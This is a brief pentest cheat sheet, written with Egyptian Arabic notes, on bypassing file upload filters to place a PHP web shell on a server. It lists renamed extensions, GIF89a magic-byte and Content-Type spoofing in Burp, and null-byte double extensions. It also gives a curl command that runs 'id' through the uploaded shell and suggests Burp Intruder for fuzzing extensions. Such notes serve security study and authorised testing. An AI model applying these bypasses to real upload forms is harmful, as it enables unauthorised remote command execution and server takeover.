# File Upload Attacks

## Bypass امتدادات بسيط
```text
shell.php -> shell.php.jpg / shell.phtml / shell.phP / shell.pHp5
```

## Bypass Content-Type / Magic Bytes
```text
أضف magic bytes بتاعة صورة (GIF89a;) في بداية ملف الـ php shell
عدّل Content-Type في Burp لـ image/jpeg وقت الرفع
```

## Double extension / Null byte (نظم قديمة)
```text
shell.php%00.jpg
shell.php.jpg  (لو السيرفر بيشيك آخر امتداد فقط وفيه misconfig)
```

## بعد الرفع الناجح
```bash
curl http://<host>/uploads/shell.php?cmd=id
```

## أدوات
```bash
# Burp Intruder لتجربة امتدادات متعددة بسرعة على نفس الطلب
```
